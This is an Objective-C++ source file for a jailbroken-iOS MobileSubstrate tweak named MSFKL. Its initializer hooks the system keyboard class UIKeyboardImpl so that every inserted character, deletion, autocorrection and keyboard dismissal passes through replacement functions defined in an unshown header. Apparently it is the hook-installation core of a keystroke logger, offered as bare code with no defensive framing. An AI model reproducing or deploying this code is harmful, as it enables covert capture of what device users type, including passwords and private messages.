//
//  MSFKL.mm
//  MSFKL
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright __MyCompanyName__ 2013. All rights reserved.
//
//  MobileSubstrate, libsubstrate.dylib, and substrate.h are
//  created and copyrighted by Jay Freeman a.k.a saurik and 
//  are protected by various means of open source licensing.
//
//  Additional defines courtesy Lance Fetters a.k.a ashikase
//


#import <Foundation/Foundation.h>
#include <stdio.h>
//#include "substrate.h"
#include "CydiaSubstrate.h"

#define HOOK(class, name, type, args...) \
static type (*_ ## class ## $ ## name)(class *self, SEL sel, ## args); \
static type $ ## class ## $ ## name(class *self, SEL sel, ## args)

#define CALL_ORIG(class, name, args...) \
_ ## class ## $ ## name(self, sel, ## args)

#define MSHake(name) \
&$ ## name, &_ ## name

#import "Keyboard.h"

extern "C" void MSFKLInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];	
    	
	Class $UIKeyboardImpl(objc_getClass("UIKeyboardImpl"));
	//_UIKeyboardImpl$handleStringInput$fromVariantKey$ = MSHookMessage($UIKeyboardImpl, @selector(handleStringInput:fromVariantKey:), &$UIKeyboardImpl$handleStringInput$fromVariantKey$);

	//	_UIKeyboardImpl$handleKeyEvent$ = MSHookMessage($UIKeyboardImpl, @selector(handleKeyEvent:), &$UIKeyboardImpl$handleKeyEvent$);
	//	_UIKeyboardImpl$mediaKeyDown$ = MSHookMessage($UIKeyboardImpl, @selector(mediaKeyDown:), &$UIKeyboardImpl$mediaKeyDown$);
	//	_UIKeyboardImpl$_remapKeyEvent$ = MSHookMessage($UIKeyboardImpl, @selector(_remapKeyEvent:), &$UIKeyboardImpl$_remapKeyEvent$);
	//	_UIKeyboardImpl$_handleWebKeyEvent$withInputString$ = MSHookMessage($UIKeyboardImpl, @selector(_handleWebKeyEvent:withInputString:), &$UIKeyboardImpl$_handleWebKeyEvent$withInputString$);
	//	_UIKeyboardImpl$_handleWebKeyEvent$withInputString$withInputStringIgnoringModifiers$ = MSHookMessage($UIKeyboardImpl, @selector(_handleWebKeyEvent:withInputString:withInputStringIgnoringModifiers:), &$UIKeyboardImpl$_handleWebKeyEvent$withInputString$withInputStringIgnoringModifiers$);
	//	_UIKeyboardImpl$_handleWebKeyEvent$withEventType$withInputString$withInputStringIgnoringModifiers$ = MSHookMessage($UIKeyboardImpl, @selector(_handleWebKeyEvent:withEventType:withInputString:withInputStringIgnoringModifiers:), &$UIKeyboardImpl$_handleWebKeyEvent$withEventType$withInputString$withInputStringIgnoringModifiers$);
	//	_UIKeyboardImpl$updateKeyboardEventsLagging$ = MSHookMessage($UIKeyboardImpl, @selector(updateKeyboardEventsLagging:), &$UIKeyboardImpl$updateKeyboardEventsLagging$);
	//	_UIKeyboardImpl$updateCandidateDisplayAsyncWithCandidates$forInputManager$ = MSHookMessage($UIKeyboardImpl, @selector(updateCandidateDisplayAsyncWithCandidates:forInputManager:), &$UIKeyboardImpl$updateCandidateDisplayAsyncWithCandidates$forInputManager$);
	//_UIKeyboardImpl$updateInputContextForDeletedText$toWordRange$ = MSHookMessage($UIKeyboardImpl, @selector(updateInputContextForDeletedText:toWordRange:), &$UIKeyboardImpl$updateInputContextForDeletedText$toWordRange$);
	
	
	//_UIKeyboardImpl$addInputString$fromVariantKey$ = MSHookMessage($UIKeyboardImpl, @selector(addInputString:fromVariantKey:), &$UIKeyboardImpl$addInputString$fromVariantKey$);
    MSHookMessage($UIKeyboardImpl, @selector(addInputString:fromVariantKey:), $UIKeyboardImpl$addInputString$fromVariantKey$, &_UIKeyboardImpl$addInputString$fromVariantKey$);
	//_UIKeyboardImpl$deleteFromInput = MSHookMessage($UIKeyboardImpl, @selector(deleteFromInput), &$UIKeyboardImpl$deleteFromInput);
    MSHookMessage($UIKeyboardImpl, @selector(deleteFromInput), $UIKeyboardImpl$deleteFromInput, &_UIKeyboardImpl$deleteFromInput);
	//_UIKeyboardImpl$applyAutocorrection = MSHookMessage($UIKeyboardImpl, @selector(applyAutocorrection), &$UIKeyboardImpl$applyAutocorrection);
    MSHookMessage($UIKeyboardImpl, @selector(applyAutocorrection), $UIKeyboardImpl$applyAutocorrection, &_UIKeyboardImpl$applyAutocorrection);
	//_UIKeyboardImpl$keyboardDidHide$ = MSHookMessage($UIKeyboardImpl, @selector(keyboardDidHide:), &$UIKeyboardImpl$keyboardDidHide$);
    MSHookMessage($UIKeyboardImpl, @selector(keyboardDidHide:), $UIKeyboardImpl$keyboardDidHide$, &_UIKeyboardImpl$keyboardDidHide$);
	//_UIKeyboardImpl$dismissKeyboard = MSHookMessage($UIKeyboardImpl, @selector(dismissKeyboard), &$UIKeyboardImpl$dismissKeyboard);
	MSHookMessage($UIKeyboardImpl, @selector(dismissKeyboard), $UIKeyboardImpl$dismissKeyboard, &_UIKeyboardImpl$dismissKeyboard);
	
    [pool release];
}
